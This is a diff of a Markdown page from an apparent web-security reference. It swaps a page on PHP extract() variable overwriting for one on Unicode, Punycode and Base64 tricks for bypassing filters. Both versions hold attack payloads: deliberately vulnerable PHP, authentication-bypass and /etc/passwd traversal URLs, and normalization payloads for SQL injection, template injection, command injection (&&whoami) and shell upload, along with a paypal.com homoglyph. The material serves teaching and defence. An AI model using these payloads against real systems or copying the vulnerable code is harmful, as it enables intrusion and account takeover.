@@ -1,98 +1,111 @@
-# External Variable Modification
+# Encoding and Transformations
 
-> External Variable Modification Vulnerability occurs when a web application improperly handles user input, allowing attackers to overwrite internal variables. In PHP, functions like extract($_GET), extract($_POST), or import_request_variables() can be abused if they import user-controlled data into the global scope without proper validation. This can lead to security issues such as unauthorized changes to application logic, privilege escalation, or bypassing security controls.
+> Encoding and Transformations are techniques that change how data is represented or transferred without altering its core meaning. Common examples include URL encoding, Base64, HTML entity encoding, and Unicode transformations. Attackers use these methods as gadgets to bypass input filters, evade web application firewalls, or break out of sanitization routines.
 
 ## Summary
 
-* [Methodology](#methodology)
-    * [Overwriting Critical Variables](#overwriting-critical-variables)
-    * [Poisoning File Inclusion](#poisoning-file-inclusion)
-    * [Global Variable Injection](#global-variable-injection)
-* [Remediations](#remediations)
+* [Unicode](#unicode)
+    * [Unicode Normalization](#unicode-normalization)
+    * [Punycode](#punycode)
+* [Base64](#base64)
+* [Labs](#labs)
 * [References](#references)
 
-## Methodology
+## Unicode
 
-The `extract()` function in PHP imports variables from an array into the current symbol table. While it may seem convenient, it can introduce serious security risks, especially when handling user-supplied data.
+Unicode is a universal character encoding standard used to represent text from virtually every writing system in the world. Each character (letters, numbers, symbols, emojis) is assigned a unique code point (for example, U+0041 for "A"). Unicode encoding formats like UTF-8 and UTF-16 specify how these code points are stored as bytes.
 
-* It allows overwriting existing variables.
-* It can lead to **variable pollution**, impacting security mechanisms.
-* It can be used as a **gadget** to trigger other vulnerabilities like Remote Code Execution (RCE) and Local File Inclusion (LFI).
+### Unicode Normalization
 
-By default, `extract()` uses `EXTR_OVERWRITE`, meaning it **replaces existing variables** if they share the same name as keys in the input array.
+Unicode normalization is the process of converting Unicode text into a standardized, consistent form so that equivalent characters are represented the same way in memory.
 
-### Overwriting Critical Variables
+[Unicode Normalization reference table](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)
 
-If `extract()` is used in a script that relies on specific variables, an attacker can manipulate them.
+* **NFC** (Normalization Form Canonical Composition): Combines decomposed sequences into precomposed characters where possible.
+* **NFD** (Normalization Form Canonical Decomposition): Breaks characters into their decomposed forms (base + combining marks).
+* **NFKC** (Normalization Form Compatibility Composition): Like NFC, but also replaces characters with compatibility equivalents (may change appearance/format).
+* **NFKD** (Normalization Form Compatibility Decomposition): Like NFD, but also decomposes compatibility characters.
 
-```php
-<?php
-    $authenticated = false;
-    extract($_GET);
-    if ($authenticated) {
-        echo "Access granted!";
-    } else {
-        echo "Access denied!";
-    }
-?>
+| Character     | Payload               | After Normalization   |
+| ------------- | --------------------- | --------------------- |
+| `‥` (U+2025)  | `‥/‥/‥/etc/passwd`    | `../../../etc/passwd` |
+| `︰` (U+FE30) | `︰/︰/︰/etc/passwd` | `../../../etc/passwd` |
+| `＇` (U+FF07) | `＇ or ＇1＇=＇1`     | `' or '1'='1`         |
+| `＂` (U+FF02) | `＂ or ＂1＂=＂1`     | `" or "1"="1`         |
+| `﹣` (U+FE63) | `admin'﹣﹣`          | `admin'--`            |
+| `。` (U+3002) | `domain。com`         | `domain.com`          |
+| `／` (U+FF0F) | `／／domain.com`      | `//domain.com`        |
+| `＜` (U+FF1C) | `＜img src=a＞`       | `<img src=a/>`        |
+| `﹛` (U+FE5B) | `﹛﹛3+3﹜﹜`         | `{{3+3}}`             |
+| `［` (U+FF3B) | `［［5+5］］`         | `[[5+5]]`             |
+| `＆` (U+FF06) | `＆＆whoami`          | `&&whoami`            |
+| `ｐ` (U+FF50) | `shell.ｐʰｐ`         | `shell.php`           |
+| `ʰ` (U+02B0)  | `shell.ｐʰｐ`         | `shell.php`           |
+| `ª` (U+00AA)  | `ªdmin`               | `admin`               |
+
+```py
+import unicodedata
+string = "ᴾᵃʸˡᵒᵃᵈˢ𝓐𝓵𝓵𝕋𝕙𝕖𝒯𝒽𝒾𝓃ℊ𝓈"
+print ('NFC: ' + unicodedata.normalize('NFC', string))
+print ('NFD: ' + unicodedata.normalize('NFD', string))
+print ('NFKC: ' + unicodedata.normalize('NFKC', string))
+print ('NFKD: ' + unicodedata.normalize('NFKD', string))
 ```
 
-**Exploitation:**
+### Punycode
 
-In this example, the use of `extract($_GET)` allow an attacker to set the `$authenticated` variable to `true`:
+Punycode is a way to represent Unicode characters (including non-ASCII letters, symbols, and scripts) using only the limited set of ASCII characters (letters, digits, and hyphens).
+
+It's mainly used in the Domain Name System (DNS), which traditionally supports only ASCII. Punycode allows internationalized domain names (IDNs), so that domain names can include characters from many languages by converting them into a safe ASCII form.
+
+| Visible in Browser (IDN support) | Actual ASCII (Punycode) |
+| -------------------------------- | ----------------------- |
+| раypal.com                       | xn--ypal-43d9g.com      |
+| paypal.com                       | paypal.com              |
+
+In MySQL, similar character are treated as equal. This behavior can be abused in Password Reset, Forgot Password, and OAuth Provider sections.
+
+```sql
+SELECT 'a' = 'ᵃ';
++-------------+
+| 'a' = 'ᵃ'   |
++-------------+
+|           1 |
++-------------+
+```
+
+This trick works the SQL query uses `COLLATE utf8mb4_0900_as_cs`.
+
+```sql
+SELECT 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs;
++----------------------------------------+
+| 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs   |
++----------------------------------------+
+|                                      0 |
++----------------------------------------+
+```
+
+## Base64
+
+Base64 encoding is a method for converting binary data (like images or files) or text with special characters into a readable string that uses only ASCII characters (A-Z, a-z, 0-9, +, and /). Every 3 bytes of input are divided into 4 groups of 6 bits and mapped to 4 Base64 characters. If the input isn't a multiple of 3 bytes, the output is padded with `=` characters.
 
 ```ps1
-http://example.com/vuln.php?authenticated=true
-http://example.com/vuln.php?authenticated=1
+echo -n admin | base64                            
+YWRtaW4=
+
+echo -n YWRtaW4= | base64 -d
+admin
 ```
 
-### Poisoning File Inclusion
+## Labs
 
-If `extract()` is combined with file inclusion, attackers can control file paths.
-
-```php
-<?php
-    $page = "config.php";
-    extract($_GET);
-    include "$page";
-?>
-```
-
-**Exploitation:**
-
-```ps1
-http://example.com/vuln.php?page=../../etc/passwd
-```
-
-### Global Variable Injection
-
-:warning: As of PHP 8.1.0, write access to the entire `$GLOBALS` array is no longer supported.
-
-Overwriting `$GLOBALS` when an application calls `extract` function on untrusted value:
-
-```php
-extract($_GET);
-```
-
-An attacker can manipulate **global variables**:
-
-```ps1
-http://example.com/vuln.php?GLOBALS[admin]=1
-```
-
-## Remediations
-
-Use `EXTR_SKIP` to prevent overwriting:
-
-```php
-extract($_GET, EXTR_SKIP);
-```
+* [NahamCon - Puny-Code: 0-Click Account Takeover](https://github.com/VoorivexTeam/white-box-challenges/tree/main/punycode)
+* [PentesterLab - Unicode and NFKC](https://pentesterlab.com/exercises/unicode-transform)
 
 ## References
 
-* [CWE-473: PHP External Variable Modification - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260210044429/https://cwe.mitre.org/data/definitions/473.html)
-* [CWE-621: Variable Extraction Error - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260223131419/https://cwe.mitre.org/data/definitions/621.html)
-* [Function extract - PHP Documentation - March 21, 2001](https://web.archive.org/web/20260210044429/https://www.php.net/manual/en/function.extract.php)
-* [$GLOBALS variables - PHP Documentation - April 30, 2008](https://web.archive.org/web/20260307071107/https://www.php.net/manual/en/reserved.variables.globals.php)
-* [The Ducks - HackThisSite - December 14, 2016](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)
-* [Extracttheflag! - Orel / WindTeam - February 28, 2024](https://web.archive.org/web/20250709004721/https://ctftime.org/writeup/38076)
+* [Puny-Code, 0-Click Account Takeover - Voorivex - June 1, 2025](https://web.archive.org/web/20251211233427/https://blog.voorivex.team/puny-code-0-click-account-takeover)
+* [Unicode normalization vulnerabilities - Lazar - September 30, 2021](https://web.archive.org/web/20251224043224/https://lazarv.com/posts/unicode-normalization-vulnerabilities/)
+* [Unicode Normalization Vulnerabilities & the Special K Polyglot - AppCheck - September 2, 2019](https://web.archive.org/web/20190916002602/https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
+* [WAF Bypassing with Unicode Compatibility - Jorge Lajara - February 19, 2020](https://web.archive.org/web/20251230185141/https://jlajara.gitlab.io/Bypass_WAF_Unicode)
+* [When "Zoë" !== "Zoë". Or why you need to normalize Unicode strings - Alessandro Segala - March 11, 2019](https://web.archive.org/web/20260128220322/https://withblue.ink/2019/03/11/why-you-need-to-normalize-unicode-strings.html)
